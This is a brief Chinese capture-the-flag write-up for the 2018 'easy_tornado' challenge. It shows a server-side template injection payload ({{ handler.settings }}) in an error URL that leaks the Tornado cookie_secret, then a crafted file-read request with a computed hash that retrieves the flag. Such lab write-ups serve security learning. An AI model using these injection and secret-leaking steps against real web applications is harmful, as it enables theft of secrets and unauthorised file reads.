# [护网杯 2018]easy_tornado

## 一、Hints

```php
md5(cookie_secret+md5(filename))
```

猜测：需要先获取**cookie_secret**然后进行文件包含读取flag



## 二、寻找突破点

发现存在SSTI注入：*/error?msg=Error{{ 2 }}*



## 三、获取配置信息

```
/error?msg=ERR{{ handler.settings }}
```

得到

```json
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '845cffd2-9954-45ad-8984-ab83ed9b325a'}
```



## 四、Get flag

通过 *cookie_secret* 生成 *filehash*，读取 flag

Payload：

```js
/file?filename=/fllllllllllllag&filehash=cac2fcdeb62b85584b49474f9a4f0c6b
```

